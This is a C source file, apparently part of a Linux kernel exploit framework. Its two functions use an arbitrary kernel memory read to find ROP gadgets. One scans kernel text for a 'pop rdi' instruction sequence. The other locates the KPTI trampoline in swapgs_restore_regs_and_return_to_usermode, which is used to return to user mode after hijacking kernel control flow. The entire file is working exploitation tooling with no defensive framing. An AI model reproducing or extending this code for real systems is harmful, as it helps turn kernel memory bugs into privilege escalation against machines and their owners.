#define _GNU_SOURCE
#include <string.h>

#include <uallsyms/uallsyms.h>

#include "utils/log.h"
#include "gadget.h"

#define PAGE_SIZE 0x1000

kaddr_t resolve_pop_rdi(uas_t *uas)
{
    kaddr_t text;
    kaddr_t etext;
    kaddr_t cur_page;
    kaddr_t pop_rdi;
    u8 tmp[PAGE_SIZE];
    u8 *candidate;
    int ret;

    text = uas_lookup_name(uas, "_text");
    if (text == UNKNOWN_KADDR) {
        pr_err("[resolve_pop_rdi] text == UNKNOWN_KADDR\n");
        return UNKNOWN_KADDR;
    }

    pr_debug("[resolve_pop_rdi] _text: %#lx\n", text);

    etext = uas_lookup_name(uas, "_etext");
    if (etext == UNKNOWN_KADDR) {
        pr_err("[resolve_pop_rdi] etext == UNKNOWN_KADDR\n");
        return UNKNOWN_KADDR;
    }

    pr_debug("[resolve_pop_rdi] _etext: %#lx\n", etext);

    pop_rdi = UNKNOWN_KADDR;
    for (cur_page = text; cur_page < etext; cur_page += PAGE_SIZE) {
        ret = uas_aar(uas, tmp, cur_page, sizeof(tmp));
        if (ret < 0)
            return UNKNOWN_KADDR;

        candidate = memmem(tmp, sizeof(tmp), POP_RDI_SEQS, sizeof(POP_RDI_SEQS) - 1);
        if (candidate) {
            pop_rdi = cur_page + (candidate - tmp);
            break;
        }        
    }

    pr_debug("[resolve_pop_rdi] pop_rdi: %#lx\n", pop_rdi);

    return pop_rdi;
}

kaddr_t resolve_kpti_trampoline(uas_t *uas)
{
    kaddr_t swapgs_restore_regs_and_return_to_usermode;
    kaddr_t kpti_trampoline;
    u8 tmp[PAGE_SIZE];
    u8 *candidate;
    int ret;

    swapgs_restore_regs_and_return_to_usermode = uas_lookup_name(uas, "swapgs_restore_regs_and_return_to_usermode");
    if (swapgs_restore_regs_and_return_to_usermode == UNKNOWN_KADDR) {
        pr_err("[resolve_kpti_trampoline] swapgs_restore_regs_and_return_to_usermode == UNKNOWN_KADDR\n");
        return UNKNOWN_KADDR;
    }

    pr_debug("[resolve_kpti_trampoline] swapgs_restore_regs_and_return_to_usermode: %#lx\n", swapgs_restore_regs_and_return_to_usermode);

    ret = uas_aar(uas, tmp, swapgs_restore_regs_and_return_to_usermode, sizeof(tmp));
    if (ret < 0)
        return UNKNOWN_KADDR;

    candidate = memmem(tmp, sizeof(tmp), KPTI_TRAMPOLINE_SEQS, sizeof(KPTI_TRAMPOLINE_SEQS) - 1);
    if (!candidate) {
        pr_err("[resolve_kpti_trampoline] candidate == NULL\n");
        return UNKNOWN_KADDR;
    }

    kpti_trampoline = swapgs_restore_regs_and_return_to_usermode + (candidate - tmp);

    pr_debug("[resolve_kpti_trampoline] kpti_trampoline: %#lx\n", kpti_trampoline);

    return kpti_trampoline;
}